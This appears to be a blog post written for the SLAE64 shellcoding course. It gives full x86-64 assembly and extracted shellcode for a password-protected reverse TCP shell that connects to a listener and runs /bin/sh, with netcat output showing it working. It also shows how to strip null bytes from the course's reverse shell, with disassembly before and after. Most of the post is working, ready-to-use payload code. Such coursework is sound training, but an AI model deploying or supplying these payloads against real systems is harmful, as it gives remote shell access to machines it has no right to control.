---
layout: single
title: SLAE64 Assignment 2 - Shell Reverse Tcp with Password
date: 2020-6-03
classes: wide
header:
  teaser: /assets/images/slae/SHELLCODING64.png
tags:
    - Shellcoding
    - Linux
    - x64
    - SLAE64
---

![](/assets/images/slae/SHELLCODING64.png)

## Introduction
  
The tasks for this second assignment are in a first time to create a shell reverse tcp shellcode, that will need a password before executing the shell, and in a second time to remove all null bytes from the reverse tcp shellcode discussed during the course.

All the source code for this assignment can be find on my [github repository](https://github.com/skr0x/SLAE64/tree/master/Assignment-02-Shell_reverse_tcp)

## Shell reverse tcp with password

Like in the previous assignement, we cannot use socketcall so we will use the connect syscall to initialize a connection to our netcat listener, and other syscalls that we have already seen.
And this time if a bad password is entered, we will exit properly.

```plaintext
; skrox@kali:~$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h |grep -E 'socket |connect |dup2|read |execve |exit '
; #define __NR_read 0
; #define __NR_dup2 33
; #define __NR_socket 41
; #define __NR_connect 42
; #define __NR_execve 59
; #define __NR_exit 60

global _start

section .text

_start:

   ; socket(AF_INET, SOCK_STREAM, 0) 
   xor edi, edi             
   mul edi                      ; rax, rdx, rdi set to 0
   inc edi              
   mov esi, edi                 ; SOCK_STREAM
   inc edi                      ; AF_INET
   mov al, 41                   ; socket
   syscall                  	; exec syscall

   ; connect(sockfd, {"127.0.0.1", 1337, AF_INET}, 16);
   push dword 0x0100007f	; 127.0.0.1
   push word 0x3905		; 1337
   push di 			; AF_INET
   mov rsi, rsp			; RSI point to the sockaddr struct
   mov edi, eax			; sockfd
   mov dl, 0x10			; addrlen
   mov al, 42			; connect syscall value 
   syscall                  	; exec syscall

   xchg eax, ebx		; save 0 value to EBX

   mov rsi, rsp			; RSI point to buffer on top of stack for read
   mov dl, 8			; number of bytes to read
   mov eax, ebx			; read syscall value
   syscall                  	; exec syscall

   xchg rdi, rsi		; copy user password address to RDI and keep sockfd in RSI
   mov rax, 0x737334507433334c  ; L33tP4ss
   scasq			; compare 8 bytes from RAX with 8 bytes from RDI
   xchg rdi, rsi		; reset RDI to sockfd value
   jnz goodbye			; if ZF set to 0, bad password, jump to clean exit

   mov esi, ebx			; RSI set to 0
   xchg eax, ebx		; RAX set to 0
   add esi, 3			; dup2 counter initialized

dup:
   ; dup2(sockfd, stdio)
   dec esi			; starting with stderr(2) to stdin(0)
				; RDI already set to sockfd
   mov al, 33			; dup2 syscall value
   syscall			; exec syscall
   jnz dup			; if RCX != 0 we need to confinue

   ; execve("/bin/sh", null, null)
   push rax			; string terminator
   mov al, 59			; execve syscall value
   mov rdi, 0x68732f2f6e69622f  ; "/bin//sh"
   push rdi			
   mov rdi, rsp			; RDI point to "/bin//sh"
        			; RSI already set to null pointer
   cdq				; RDX set to null pointer
   syscall                  	; exec syscall

goodbye:
   xchg eax, ebx
   mov al, 60			; exit syscall value
   syscall			; and exit
```
Then we extract the shellcode :
```plaintext
skrox@kali:~$./compile.sh reverse-pass
[x] Assembling...
[x] Linking...
[x] Dumped shellcode :
\x31\xff\xf7\xe7\xff\xc7\x89\xfe\xff\xc7\xb0\x29\x0f\x05\x68\x7f\x00\x00\x01\x66
\x68\x05\x39\x66\x57\x48\x89\xe6\x89\xc7\xb2\x10\xb0\x2a\x0f\x05\x93\x48\x89\xe6
\xb2\x08\x89\xd8\x0f\x05\x48\x87\xfe\x48\xb8\x4c\x33\x33\x74\x50\x34\x73\x73\x48
\xaf\x48\x87\xfe\x75\x22\x89\xde\x93\x83\xc6\x03\xff\xce\xb0\x21\x0f\x05\x75\xf8
\x50\xb0\x3b\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x99\x0f\x05
\x93\xb0\x3c\x0f\x05

```
We compile it and execute it : 
```plaintext
skrox@kali:~$ g++ -fno-stack-protector -z execstack -o shellcode shellcode.cpp 
skrox@kali:~$ ./shellcode 
Shellcode size : 106

```
We will run it two times, first to test the exit, then to test the shell
In the terminal of our netcat listener : 
```plaintext
skrox@kali:~$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 36740
cvvcx
skrox@kali:~$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 36742
L33tP4ss
ls
RevShell-null-removed.nasm
RevShell-original.nasm
compile.sh
reverse-pass
reverse-pass.nasm
reverse-pass.o
shellcode
shellcode.cpp
exit

```
We are done with the first part.

## Removing Null bytes from the reverse shellcode from the course

### Dump of the original shellcode

First we will compile it then we will disassemble it :
```plaintext
skrox@kali:~$ ./compile.sh RevShell-original
[x] Assembling...
[x] Linking...
[x] Dumped shellcode :
\xb8\x29\x00\x00\x00\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\xba\x00\x00\x00\x00
\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\x7f\x00\x00\x01\x66\xc7\x44
\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\xb8\x2a\x00\x00\x00
\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\xbe\x00\x00\x00\x00
\x0f\x05\xb8\x21\x00\x00\x00\xbe\x01\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\xbe
\x02\x00\x00\x00\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68
\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
```
```nasm
skrox@kali:~$ objdump -M intel -d RevShell-original

RevShell-original:     format de fichier elf64-x86-64


Déassemblage de la section .text :

0000000000401000 <_start>:
  401000:	b8 29 00 00 00       	mov    eax,0x29
  401005:	bf 02 00 00 00       	mov    edi,0x2
  40100a:	be 01 00 00 00       	mov    esi,0x1
  40100f:	ba 00 00 00 00       	mov    edx,0x0
  401014:	0f 05                	syscall 
  401016:	48 89 c7             	mov    rdi,rax
  401019:	48 31 c0             	xor    rax,rax
  40101c:	50                   	push   rax
  40101d:	c7 44 24 fc 7f 00 00 	mov    DWORD PTR [rsp-0x4],0x100007f
  401024:	01 
  401025:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
  40102c:	66 c7 44 24 f8 02 00 	mov    WORD PTR [rsp-0x8],0x2
  401033:	48 83 ec 08          	sub    rsp,0x8
  401037:	b8 2a 00 00 00       	mov    eax,0x2a
  40103c:	48 89 e6             	mov    rsi,rsp
  40103f:	ba 10 00 00 00       	mov    edx,0x10
  401044:	0f 05                	syscall 
  401046:	b8 21 00 00 00       	mov    eax,0x21
  40104b:	be 00 00 00 00       	mov    esi,0x0
  401050:	0f 05                	syscall 
  401052:	b8 21 00 00 00       	mov    eax,0x21
  401057:	be 01 00 00 00       	mov    esi,0x1
  40105c:	0f 05                	syscall 
  40105e:	b8 21 00 00 00       	mov    eax,0x21
  401063:	be 02 00 00 00       	mov    esi,0x2
  401068:	0f 05                	syscall 
  40106a:	48 31 c0             	xor    rax,rax
  40106d:	50                   	push   rax
  40106e:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
  401075:	2f 73 68 
  401078:	53                   	push   rbx
  401079:	48 89 e7             	mov    rdi,rsp
  40107c:	50                   	push   rax
  40107d:	48 89 e2             	mov    rdx,rsp
  401080:	57                   	push   rdi
  401081:	48 89 e6             	mov    rsi,rsp
  401084:	48 83 c0 3b          	add    rax,0x3b
  401088:	0f 05                	syscall 
```
Like for the bind shell, we can see that almost all null bytes are with "mov r32,imm8" instructions 
except one "mov m16, imm8" 
```nasm
  40102c:	66 c7 44 24 f8 02 00 	mov    WORD PTR [rsp-0x8],0x2
```
two "mov r, 0x00"
```nasm
  40100f:	ba 00 00 00 00       	mov    edx,0x0
  ...
  40104b:	be 00 00 00 00       	mov    esi,0x0
```
And the mov for the loopback address 127.0.0.1
```nasm
  40101d:	c7 44 24 fc 7f 00 00 	mov    DWORD PTR [rsp-0x4],0x100007f
```
We will remove the null byte using the same techniques than for the bind shell,
Execept for the ip address that we will correct using "sub"

### Dump after null bytes removing

```nasm
skrox@kali:~$ objdump -M intel -d RevShell-null-removed

RevShell-null-removed:     format de fichier elf64-x86-64


Déassemblage de la section .text :

0000000000401000 <_start>:
  401000:	31 ff                	xor    edi,edi
  401002:	f7 e7                	mul    edi
  401004:	89 fe                	mov    esi,edi
  401006:	b0 29                	mov    al,0x29
  401008:	40 b7 02             	mov    dil,0x2
  40100b:	40 b6 01             	mov    sil,0x1
  40100e:	0f 05                	syscall 
  401010:	48 89 c7             	mov    rdi,rax
  401013:	48 31 c0             	xor    rax,rax
  401016:	50                   	push   rax
  401017:	c7 44 24 fc ff ff ff 	mov    DWORD PTR [rsp-0x4],0xffffffff
  40101e:	ff 
  40101f:	81 6c 24 fc 80 ff ff 	sub    DWORD PTR [rsp-0x4],0xfeffff80
  401026:	fe 
  401027:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
  40102e:	b0 02                	mov    al,0x2
  401030:	66 89 44 24 f8       	mov    WORD PTR [rsp-0x8],ax
  401035:	48 83 ec 08          	sub    rsp,0x8
  401039:	b0 2a                	mov    al,0x2a
  40103b:	48 89 e6             	mov    rsi,rsp
  40103e:	b2 10                	mov    dl,0x10
  401040:	0f 05                	syscall 
  401042:	b0 21                	mov    al,0x21
  401044:	31 f6                	xor    esi,esi
  401046:	0f 05                	syscall 
  401048:	b0 21                	mov    al,0x21
  40104a:	40 b6 01             	mov    sil,0x1
  40104d:	0f 05                	syscall 
  40104f:	b0 21                	mov    al,0x21
  401051:	40 b6 02             	mov    sil,0x2
  401054:	0f 05                	syscall 
  401056:	48 31 c0             	xor    rax,rax
  401059:	50                   	push   rax
  40105a:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
  401061:	2f 73 68 
  401064:	53                   	push   rbx
  401065:	48 89 e7             	mov    rdi,rsp
  401068:	50                   	push   rax
  401069:	48 89 e2             	mov    rdx,rsp
  40106c:	57                   	push   rdi
  40106d:	48 89 e6             	mov    rsi,rsp
  401070:	48 83 c0 3b          	add    rax,0x3b
  401074:	0f 05                	syscall 
```
And it's all for this second assignment :)

***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-
linux/index.html)  
Student ID: PA-14186***
